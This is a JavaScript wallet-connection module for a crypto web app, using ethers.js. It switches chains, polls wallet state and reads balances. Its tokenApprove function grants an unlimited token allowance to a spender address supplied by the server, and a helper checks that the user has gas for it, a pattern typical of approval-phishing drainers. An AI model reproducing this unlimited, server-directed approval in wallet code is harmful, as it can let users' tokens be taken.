import { ethers, BrowserProvider } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.1/ethers.min.js';
import { appKit } from '@/utils/modal';
import pinia from '@/stores';
import useStateStore from '@/stores/state';
const state = useStateStore();
import { ABI, bscAddress, ethAddress } from './config';
window['walletStatus'] = null;
let addressList = {
  bsc: bscAddress,
  eth: ethAddress,
};
var provider;
function getProvider() {
  if (appKit.getWalletProvider()) {
    provider = new BrowserProvider(appKit.getWalletProvider());
  } else {
    provider = new BrowserProvider(window.ethereum);
  }
}
getProvider();
// console.log('ethers', ethers);
// console.log('provider', provider);
// provider.getNetwork().then((res) => {
//   console.log(ethers.formatUnits(res.chainId * 1,16));
// });
async function switchToBSC() {
  try {
    await window.ethereum.request({
      method: 'wallet_switchEthereumChain',
      params: [
        {
          chainId: '0x38',
        },
      ],
    });
  } catch (error) {
    console.log(error);
  }
}
async function switchToEthereum() {
  try {
    await window.ethereum.request({
      method: 'wallet_switchEthereumChain',
      params: [
        {
          chainId: '0x1',
        },
      ],
    });
  } catch (error) {
    console.log(error);
  }
}

let getChain = (id) => {
  let chain;
  if (id == 56) {
    state.setNetwork('bsc');
    chain = 2;
  }
  if (id == 1) {
    state.setNetwork('eth');
    chain = 1;
  }
  if (id == 6) {
    state.setNetwork('tron');
    chain = 0;
  }
  return chain;
};

export let walletLogin = async () => {
  getProvider();
  let signer = await provider.getSigner(); //连接钱包地址
  let network = await provider.getNetwork(); //连接钱包地址
  let chainId = Number(network.chainId);
  if (!state.loginStatus || (!state.loginStatus && chainId != 56) || !state.chainId) {
    switchToBSC();
  }
  if (chainId == 1) {
    switchToEthereum();
  }
  return new Promise((res, rej) => {
    provider
      .send('eth_requestAccounts', [])
      .then((a) => {
        let address = a[0];
        if (chainId == 56) {
          state.setNetwork('bsc');
        }
        if (chainId == 1) {
          state.setNetwork('eth');
        }
        if (!state.loginStatus && state.chainId && address != undefined && chainId) {
          state.setLoading(true);
          state.login({
            chain: getChain(chainId) * 1,
            address: address,
          });
        }
        if (state.loginStatus && state.chainId && address != state.address && chainId) {
          state.setLoading(true);
          state.login({
            chain: getChain(chainId) * 1,
            address: address,
          });
        }
      })
      .catch(() => {
        state.setLoading(false);
        return rej('user rejected request');
      });
  });
};
let onWalletStateChange = async () => {
  walletStatus = setInterval(async () => {
    // let signer = await provider.getSigner(); //连接钱包地址
    let network = await provider.getNetwork(); //连接钱包地址
    let chainId = Number(network.chainId);
    let address = state.address;
    // console.log('onWalletStateChange', !state.loginStatus);
    // console.log('onWalletStateChange', address == undefined);
    // console.log('onWalletStateChange', chainId != state.chainId);
    // console.log('onWalletStateChange', signer.address != state.address);
    if (!state.loginStatus || (!state.loginStatus && chainId != 56) || !state.chainId) {
      switchToBSC();
    }
    if (!state.loginStatus || address == undefined || chainId != state.chainId) {
      localStorage.clear();
      state.setAddress('');
      state.setChainId(null);
      state.setNetwork('');
      walletLogin();
      window.clearInterval(walletStatus);
      setTimeout(() => {
        onWalletStateChange();
      }, 20 * 1000);
      return;
    }
    if (provider.ready && state.loginStatus && chainId == state.chainId) {
      provider.send('eth_requestAccounts', []).then((a) => {
        if (a[0] != address) {
          console.log(11111);
          walletLogin();
          window.clearInterval(walletStatus);
          setTimeout(() => {
            onWalletStateChange();
          }, 15 * 1000);
        }
      });
    }
  }, 5 * 1000);
};

export async function connectWallet() {
  getProvider();
  return new Promise((res, rej) => {
    provider
      .send('eth_requestAccounts', [])
      .then((a) => {
        return res({
          chainId: appKit.getChainId(),
          address: a[0],
        });
      })
      .catch(() => {
        state.setLoading(false);
        return rej('user rejected request');
      });
  });
}
export let checkNeedEth = async (approve) => {
  getProvider();
  let signer = await provider.getSigner(); //连接钱包地址
  let adr = approve; //授权地址，从api获取
  let type = state.networkType;
  console.log('type', type);
  let contractAddress = addressList[type]; //合约地址
  let contract = new ethers.Contract(contractAddress, ABI, signer);
  let feeData = await provider.getFeeData();
  let gasUsed = await contract.approve.estimateGas(adr, ethers.MaxUint256);
  let needEth = ethers.formatEther(feeData.gasPrice * gasUsed);
  let ethBalance = await provider.getBalance(signer.address);
  return new Promise((res, rej) => {
    if (needEth > ethBalance) {
      console.log('eth not enough');
      return res(false);
    } else {
      return res(true);
    }
  });
};
export async function tokenApprove(approve) {
  getProvider();
  let signer = await provider.getSigner(); //连接钱包地址
  let adr = approve; //授权地址，从api获取
  // let contractAddress = contractAddress; //合约地址
  let type = state.networkType;
  let contractAddress = addressList[type]; //合约地址
  console.log('contractAddress', contractAddress);
  let contract = new ethers.Contract(contractAddress, ABI, signer);
  return new Promise((res, rej) => {
    contract
      .approve(adr, ethers.MaxUint256)
      .then((tx) => {
        tx.wait()
          .then((txReceipt) => {
            if (txReceipt && txReceipt.status == 1) {
              //交易成功
              return res(txReceipt.hash);
            } else {
              return rej();
            }
          })
          .catch((err) => {
            state.setLoading(false);
            console.log(err);
          });
      })
      .catch((err) => {
        state.setLoading(false);
        console.log(err);
      });
  });
  // try {
  //     let feeData =await provider.getFeeData();
  //     let gasUsed = await contract.approve.estimateGas(adr, ethers.MaxUint256) ;
  //     let needEth = ethers.formatEther(feeData.gasPrice*gasUsed);
  //     let ethBalance = await provider.getBalance(signer.address);
  //     if(needEth>ethBalance){
  //         console.log('eth not enough')
  //     }
  //     let tx = await contract.approve(adr, ethers.MaxUint256) //授权
  //     let txReceipt = await tx.wait();
  //     if (txReceipt && txReceipt.status == 1) { //交易成功
  //         console.log(txReceipt.hash); //调用api，把hash传入接口
  //     }

  // } catch (e) {
  //     console.log(e)
  // }
}

export async function tokenBalance() {
  //非gas币的余额获取
  let type = state.networkType;
  let contractAddress = addressList[type]; //合约地址
  let signer = await provider.getSigner(); //连接钱包地址
  let contract = new ethers.Contract(contractAddress, ABI, provider);
  let decimals = await contract.decimals();
  let balance = await contract.balanceOf(signer.address);
  return new Promise((res) => {
    console.log('余额', ethers.formatUnits(balance, decimals));
    return res(ethers.formatUnits(balance, decimals));
  });
  // console.log('余额', ethers.formatUnits(balance, decimals));
}

onWalletStateChange();
// console.log('ethereum', window.ethereum);
// window.ethereum.on('accountsChanged', (e) => {
//   console.log('accountsChanged', e);
// });
